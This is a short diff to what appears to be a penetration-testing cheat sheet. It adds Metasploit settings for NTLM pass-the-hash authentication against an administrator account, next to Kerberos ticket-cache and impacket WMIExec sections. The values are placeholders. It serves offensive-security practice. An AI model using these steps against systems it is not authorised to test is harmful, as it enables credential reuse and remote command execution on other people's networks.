@@ -16,6 +16,13 @@ Kerberos Auth
     set smb::krb5ccname /root/.msf4/loot/DATE_default_IP_mit-kerberos.cca_NUM.bin
     run
 
+NTLM Auth
+
+    set rhosts TARGET_IP
+    set smbdomain domain.local
+    set username administrator
+    set smbpass LM_HASH:NTLM_HASH
+
 ### 2) WMIExec 
 
     use auxiliary/scanner/smb/impacket/wmiexec
